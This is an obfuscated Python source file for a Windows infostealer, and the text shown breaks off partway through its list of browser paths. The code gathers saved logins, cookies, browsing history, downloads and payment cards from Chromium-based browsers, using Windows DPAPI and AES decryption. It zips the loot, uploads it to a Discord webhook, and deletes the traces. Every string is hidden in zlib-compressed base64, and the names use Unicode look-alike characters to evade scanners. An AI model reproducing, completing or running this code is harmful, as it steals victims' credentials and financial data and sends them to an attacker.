import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData
__𝘓𝙊𝘎𝙄𝙉𝙎__ = []
__𝘊𝘖𝙊𝘒𝙄𝘌𝗦__ = []
__𝗪𝘌𝗕_𝗛𝙄𝗦𝙏𝘖𝙍𝙔__ = []
__𝘋𝘖𝗪𝗡𝙇𝙊𝗔𝗗𝙎__ = []
__𝗖𝘼𝙍𝘿𝗦__ = []

class Browsers:

    def __init__(self, webhook):
        𝘀𝘦𝘁𝘢𝘁𝘵𝙧(𝘀𝙚𝙡𝘧, 'webhook', 𝙎𝘺𝘯𝘤𝘞𝘦𝙗𝘩𝙤𝗼𝗸.from_url(𝘸𝘦𝗯𝙝𝘰𝙤𝘬))
        𝗖𝘩𝘳𝗼𝘮𝙞𝘂𝙢()
        𝗨𝗽𝘭𝘰𝙖𝘥(𝘴𝘦𝗹𝗳.webhook)

class Upload:

    def __init__(self, webhook):
        𝘴𝙚𝘵𝙖𝙩𝘵𝘳(𝙨𝙚𝗹𝘧, 'webhook', 𝙬𝙚𝘣𝙝𝙤𝗼𝙠)
        𝘀𝘦𝗹𝙛.write_files()
        𝙨𝗲𝘭𝗳.send()
        𝘴𝗲𝗹𝘧.clean()

    def write_files(self):
        𝙤𝘴.makedirs(__𝙞𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode(), exist_ok=True)
        if __𝙇𝙊𝘎𝙄𝙉𝘚__:
            with 𝘰𝙥𝗲𝗻(__𝙞𝗺𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08JNr\xb7\xccK\x0c7\xad\xf2\xc9\x0b2Iq\xb4\xb5\x05\x00c\xa1\x07\xbe')).decode(), __𝗶𝗺𝗽𝘰𝙧𝘵__('base64').b64decode(__𝗶𝙢𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝗶𝗺𝙥𝗼𝘳𝘵__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝗳:
                𝘧.write(__𝙞𝙢𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘴𝘁𝙧(𝙭) for 𝙭 in __𝘓𝗢𝘎𝗜𝗡𝘚__)))
        if __𝘾𝗢𝙊𝘒𝙄𝘌𝘚__:
            with 𝗼𝙥𝘦𝗻(__𝘪𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08J\x8e4\xb2,K4\xca\xc9I\xae45H\xf5\x08\xb4\x05\x00b\xd3\x07\xc9')).decode(), __𝘪𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝗶𝗺𝘱𝗼𝘳𝙩__('base64').b64decode(__𝘪𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝙛:
                𝘧.write(__𝙞𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝙨𝙩𝙧(𝘹) for 𝙭 in __𝗖𝙊𝙊𝗞𝗜𝘌𝗦__)))
        if __𝘞𝗘𝗕_𝗛𝗜𝘚𝗧𝗢𝗥𝗬__:
            with 𝗼𝗽𝙚𝗻(__𝗶𝘮𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08JN1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcb.M\xf1\xc80\x00\x00\x8a\x18\t\xb2')).decode(), __𝙞𝘮𝙥𝘰𝙧𝙩__('base64').b64decode(__𝘪𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝗶𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝘧:
                𝙛.write(__𝗶𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘴𝘵𝘳(𝘅) for 𝙭 in __𝙒𝘌𝘉_𝙃𝗜𝙎𝙏𝗢𝙍𝗬__)))
        if __𝘿𝘖𝗪𝙉𝙇𝗢𝘈𝘋𝗦__:
            with 𝙤𝙥𝗲𝘯(__𝗶𝘮𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08J\x8er\xb74N\xca\xad(\x8b\x0c\x0f\xaa\xf2\xc9\x0b2Iq\xb4\xb5\x05\x00\x88\xc9\tM')).decode(), __𝗶𝗺𝗽𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝙞𝘮𝗽𝗼𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝗳:
                𝘧.write(__𝘪𝗺𝘱𝗼𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘀𝙩𝗿(𝘅) for 𝙭 in __𝘿𝘖𝗪𝗡𝗟𝙊𝗔𝗗𝘚__)))
        if __𝗖𝗔𝗥𝗗𝗦__:
            with 𝗼𝘱𝗲𝙣(__𝙞𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08J\x8e4r\xab\x8c\xf2\xf0-M\xf1\xc80\x00\x00E\x99\x06\x9a')).decode(), __𝘪𝘮𝘱𝙤𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝘪𝘮𝗽𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝘧:
                𝘧.write(__𝘪𝗺𝙥𝙤𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝙨𝘵𝗿(𝙭) for 𝘅 in __𝗖𝗔𝗥𝘿𝙎__)))
        with 𝙕𝙞𝘱𝙁𝙞𝘭𝙚(__𝗶𝘮𝘱𝗼𝙧𝘁__('base64').b64decode(__𝙞𝙢𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08,M\xcd\xcd)\x07\x00\x1bA\x04n')).decode(), __𝙞𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as 𝘇𝙞𝙥:
            for 𝗳𝘪𝘭𝗲 in 𝗼𝘀.listdir(__𝙞𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode()):
                𝙯𝙞𝙥.write(__𝙞𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝗶𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08JN56\xb0\x05\x00\x19\x8d\x03\xad')).decode().format(𝘧𝗶𝗹𝗲), 𝘧𝗶𝘭𝘦)

    def send(self):
        𝙨𝗲𝙡𝘧.webhook.send(embed=𝙀𝘮𝘣𝘦𝗱(title=__𝘪𝗺𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x0b\xcbu3L\xf2\x08\xb4\x05\x00\x0b\x8b\x02s')).decode(), description=__𝙞𝙢𝘱𝗼𝙧𝘵__('base64').b64decode(__𝗶𝙢𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x8btwJ\x07\x00\x03(\x01J')).decode() + __𝘪𝘮𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join(𝘴𝙚𝙡𝘧.tree(𝘗𝙖𝘵𝘩(__𝙞𝘮𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode()))) + __𝗶𝘮𝙥𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8btwJ\x07\x00\x03(\x01J')).decode()), file=𝙁𝙞𝘭𝙚(__𝘪𝗺𝗽𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08,M\xcd\xcd)\x07\x00\x1bA\x04n')).decode()), username=__𝘪𝗺𝗽𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x0b\n7,O\x8d\xf0\xca\x89\x0c7\xb1\x05\x00\x1a0\x03\xe6')).decode(), avatar_url=__𝙞𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝗶𝗺𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4,\xf0\xc9\xcd)\x892\x0e\xab\xf4\xc9\xf5+K\n\xb6\xf4L\xcc+\xc8M\xcc\x8d\n\xf6\xc9s*\x8d*\xb7\xb5\x05\x00Q\xda\x0fT')).decode())

    def clean(self):
        𝘴𝗵𝙪𝘵𝙞𝗹.rmtree(__𝗶𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode())
        𝗼𝘀.remove(__𝙞𝘮𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08,M\xcd\xcd)\x07\x00\x1bA\x04n')).decode())

    def tree(self, path, prefix=__𝙞𝗺𝘱𝙤𝘳𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode(), midfix_folder=__𝙞𝗺𝗽𝗼𝗿𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xb3\xf0\xd2\x0eI\xcft,\xf1t\xb4\xb5\x05\x00\x16\xfb\x03\x8b')).decode(), midfix_file=__𝗶𝙢𝘱𝗼𝘳𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xb3\xf0\xd2\x0e\xc9pv,\xf1t\xb4\xb5\x05\x00\x15\xf9\x03f')).decode()):
        𝙥𝘪𝘱𝘦𝙨 = {__𝗶𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK6v\xca\x884\n\xb5\x05\x00\n\xfa\x02^')).decode(): __𝙞𝗺𝘱𝗼𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3tvL\xf7t\xb4\xb5\x05\x00\nL\x029')).decode(), __𝘪𝘮𝗽𝗼𝗿𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x8b\xcc\xf3\xcaH\xca\xf5\xcb\x07\x00\rp\x03\x06')).decode(): __𝗶𝘮𝘱𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda3)\x08v\xf6tvL\x07\x00\n\xcf\x02o')).decode(), __𝙞𝘮𝗽𝙤𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xdaKq\x0f\xcb\x01\x00\x03\x81\x01n')).decode(): __𝘪𝘮𝘱𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda3)\x08N6)\x08v\x04aOG[[\x00*\xbd\x04\xcf')).decode(), __𝘪𝘮𝘱𝘰𝘳𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKrw\xabJq\xb4\xb5\x05\x00\x0c\x19\x02\x89')).decode(): __𝗶𝙢𝗽𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda3)\x08\x0e5)\x08v\x04aOG[[\x00*\x07\x04\xc1')).decode()}
        if 𝙥𝗿𝗲𝙛𝘪𝘅 == __𝗶𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            yield (𝘮𝘪𝗱𝘧𝙞𝘹_𝗳𝙤𝗹𝙙𝙚𝙧 + 𝘱𝙖𝘵𝗵.name)
        𝗰𝙤𝗻𝙩𝘦𝗻𝘵𝙨 = 𝙡𝙞𝘀𝘁(𝗽𝙖𝘁𝗵.iterdir())
        𝙥𝗼𝗶𝗻𝘵𝗲𝗿𝙨 = [𝗽𝙞𝙥𝗲𝙨[__𝗶𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝙞𝙢𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKq\x0f\xcb\x01\x00\x03\x81\x01n')).decode()]] * (𝘭𝙚𝙣(𝘤𝙤𝗻𝘵𝗲𝗻𝘵𝙨) - 𝗶𝙣𝙩.from_bytes(𝘮𝙖𝙥(lambda O, i: 512 - (𝙞𝙣𝘁(𝗢) + 𝙞), 𝗺𝗮𝗽(__𝘪𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝗶𝘵𝗲𝘳(__𝙞𝘮𝘱𝗼𝙧𝘁__('base64').b64decode(__𝙞𝘮𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3\x0bq\xad\x00\x00\x03:\x01`')).decode())] * 3)), 𝗿𝘢𝗻𝘨𝗲(1)), __𝘪𝘮𝘱𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)) + [𝙥𝗶𝗽𝘦𝘴[__𝙞𝙢𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKrw\xabJq\xb4\xb5\x05\x00\x0c\x19\x02\x89')).decode()]]
        for (𝙥𝙤𝙞𝘯𝙩𝘦𝘳, 𝗽𝙖𝙩𝘩) in 𝘻𝙞𝙥(𝘱𝗼𝗶𝗻𝘵𝗲𝗿𝘴, 𝙘𝗼𝗻𝘁𝙚𝗻𝘵𝘴):
            if 𝙥𝘢𝘁𝘩.is_dir():
                yield __𝗶𝗺𝙥𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK564O\x8b(\xb1L56H\xf7\xf6(\xb1\xf4t\x8f*Hr\x0f\xab\xf2qv2\xf7\xcf4\xa9\x8c\xca3HO4\xf2,\x00\x00\x008\x0c\xc6')).decode().format(𝙥𝘳𝘦𝘧𝗶𝘹, 𝙥𝙤𝘪𝙣𝙩𝗲𝘳, 𝘮𝘪𝙙𝗳𝘪𝘹_𝙛𝘰𝙡𝙙𝙚𝘳, 𝘱𝗮𝘁𝙝.name, 𝘭𝘦𝗻(𝘭𝗶𝘴𝙩(𝘱𝘢𝘵𝘩.glob(__𝘪𝘮𝙥𝘰𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xce\xcc/\xf3N\xb7\xb5\x05\x00\r?\x02\xc6')).decode()))), 𝘀𝙪𝗺((𝗳.stat().st_size for 𝘧 in 𝙥𝙖𝙩𝙝.glob(__𝙞𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xce\xcc/\xf3N\xb7\xb5\x05\x00\r?\x02\xc6')).decode()) if 𝘧.is_file())) / 𝘪𝘯𝙩.from_bytes(𝙢𝘢𝙥(lambda O, i: 286 - (𝘪𝘯𝘵(𝙊) + 𝙞), 𝙢𝗮𝘱(__𝘪𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝗶𝘁𝘦𝗿(__𝗶𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xcdJ7\xf2\xcdJ\xaf\x00\x00\x0cr\x02\xe7')).decode())] * 3)), 𝗿𝗮𝗻𝘨𝙚(2)), __𝘪𝗺𝙥𝗼𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
                𝘦𝘹𝘁𝗲𝘯𝘴𝙞𝘰𝗻 = 𝘱𝗶𝗽𝘦𝙨[__𝙞𝙢𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8b\xcc\xf3\xcaH\xca\xf5\xcb\x07\x00\rp\x03\x06')).decode()] if 𝘱𝗼𝗶𝙣𝘵𝗲𝘳 == 𝙥𝗶𝙥𝙚𝘀[__𝘪𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKq\x0f\xcb\x01\x00\x03\x81\x01n')).decode()] else 𝙥𝗶𝘱𝗲𝘴[__𝘪𝘮𝘱𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK6v\xca\x884\n\xb5\x05\x00\n\xfa\x02^')).decode()]
                yield from 𝙨𝙚𝗹𝙛.tree(𝗽𝙖𝙩𝘩, prefix=𝘱𝙧𝗲𝘧𝙞𝘅 + 𝙚𝘹𝘁𝙚𝗻𝙨𝘪𝙤𝘯)
            else:
                yield __𝙞𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK564O\x8b(\xb1L56H\xf7\xf6(6\xf3\xc9\xf2\xcaM\x0bv*\x8a\xcc\xcc\xb6\x05\x00~\x97\t\x1b')).decode().format(𝗽𝙧𝗲𝙛𝘪𝘹, 𝗽𝙤𝘪𝗻𝘵𝘦𝗿, 𝙢𝗶𝙙𝗳𝘪𝙭_𝗳𝘪𝙡𝘦, 𝘱𝗮𝘵𝙝.name, 𝘱𝗮𝘵𝙝.stat().st_size / 𝘪𝗻𝘁.from_bytes(𝙢𝗮𝙥(lambda O, i: 619 - (𝙞𝗻𝘁(𝘖) + 𝘪), 𝗺𝘢𝙥(__𝗶𝗺𝗽𝘰𝗿𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝗶𝘵𝙚𝙧(__𝙞𝙢𝘱𝘰𝘳𝙩__('base64').b64decode(__𝘪𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xcbr5\xf5\xcbr5\x00\x00\x0b5\x02`')).decode())] * 3)), 𝙧𝗮𝙣𝘨𝘦(2)), __𝙞𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝘪𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))

class Chromium:

    def __init__(self):
        𝘴𝙚𝘁𝙖𝘵𝘵𝘳(𝙨𝘦𝙡𝙛, 'appdata', 𝙤𝘀.getenv(__𝙞𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0bq\xb5t\t\x0c\xadp\nusr\r\x0c\x0br\x02\x00)\x05\x04\xd4')).decode()))
        𝘴𝗲𝙩𝗮𝙩𝙩𝙧(𝙨𝗲𝘭𝙛, 'browsers', {__𝗶𝗺𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8b\x0c7,\x882\xb2\xb0\x05\x00\x0b2\x02S')).decode(): 𝘀𝙚𝗹𝘧.appdata + __𝗶𝗺𝙥𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8bpu+I\x0cO)\x8bp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00h\x16\x07\xed')).decode(), __𝘪𝗺𝙥𝘰𝘳𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKq\xb7\xac\x8c4J\xb7\x05\x00\x0b\xd1\x02\x8d')).decode(): 𝙨𝗲𝗹𝙛.appdata + __𝙞𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x8bp\x0b*K\xce\xf5\xcb\x8fp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00i&\x07\xf7')).decode(), __𝗶𝘮𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK4\xb2,\x89\x8a\x08\xca\x00\x00\x0b\x84\x02\xad')).decode(): 𝘴𝙚𝙡𝘧.appdata + __𝘪𝗺𝙥𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x8bp-)K\n\x0f3\x88\x0c\xab\x08K6\n\xab\xf4t\r\xcaHqw\xb5\x05\x00h\xc4\x08\x1d')).decode(), __𝗶𝗺𝘱𝗼𝘳𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK2\xf6\xcaL\x8c\x082L\n\xb4\xb5\x05\x00\x18\xed\x03\xb2')).decode(): 𝘴𝗲𝘭𝗳.appdata + __𝗶𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝘳𝘵__('zlib').decompress(b"x\xda\x8bp\xb5\xac\x8c\xcc\xcd1H\t7L\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00e;\x08'")).decode(), __𝘪𝗺𝘱𝗼𝙧𝘁__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8b4\n+Mq6\xccL\xce\xb54N6\n\xab\x04\x00,\x0e\x058')).decode(): 𝙨𝗲𝙡𝘧.appdata + __𝘪𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xf5\xcbI\xca\x0brN\xce\xb54N6\n\xab\x8cp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\xb0\xd7\n`')).decode(), __𝙞𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf33\xf63\x88\x8c\xf0\xb4\x05\x00\t\xdc\x027')).decode(): 𝙨𝗲𝙡𝘧.appdata + __𝘪𝙢𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x8bpI\tIqw\xab\x8c\x80\xd1naUQ\x11\x9e\xe9A\xeen\x06\x91\x81\xb6\xb6\x00\xb2\xf0\n\x80')).decode(), __𝘪𝘮𝗽𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK6v2Lq7-H,\xb7\xb5\x05\x00\x17M\x03\xac')).decode(): 𝘀𝘦𝘭𝘧.appdata + __𝗶𝗺𝘱𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8bp\xf3+O\x89\x08*M\x0c/I\x0e5v2Lq7-H4\xac\x08K6\n\xab\xf4t\r\xcaHqw\xb5\x05\x00\xe3\x16\x0b\xfa')).decode(), __𝘪𝗺𝙥𝙤𝘳𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK\xc9\xcd1\x8a\x0c\xaf\xc8N\x0c\xb4\xb5\x05\x00\x1c\xa3\x04/')).decode(): 𝘴𝘦𝗹𝗳.appdata + __𝗶𝗺𝘱𝗼𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\x8b*H\xc9u+\x8er\xcfI\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00k\xb8\x08\x89')).decode(), __𝙞𝗺𝗽𝙤𝙧𝙩__('base64').b64decode(__𝙞𝗺𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8b2\xb2,\x8b2\xaa\xc8\xf1\t\xf7\xcbO\xce\xb5,\x89\n6\xacJ\xf5\xf0\xb5\x05\x00e5\x08\x18')).decode(): 𝙨𝙚𝘭𝙛.appdata + __𝗶𝘮𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x8bpM)K2J)\x8e\n\xabpI\xf4\xf0*K\n\x0fM\x0f5\xce\x08\x89p\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\x1e\xf4\rt')).decode(), __𝗶𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x8b2\xb2,\x8b2\xaa\xc8\xf1\t\xf7\xcbO\xce\xb5,\x89\n\xb4\xb5\x05\x00FC\x06\xae')).decode(): 𝘴𝙚𝘭𝘧.appdata + __𝗶𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x8bpM)K2J)\x8e\n\xabpI\xf4\xf0*K\n\x0fK\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00\xbb\xe6\x0bP')).decode(), __𝙞𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x8b\x8ap*\x88\xac4,O\xce\xcd1\x8a\x0c\xf73\xf5\t\xf7\xaaL2N\xa9\x8a\x8a\xf0\xb4\x05\x00\x8dK\t\x91')).decode(): 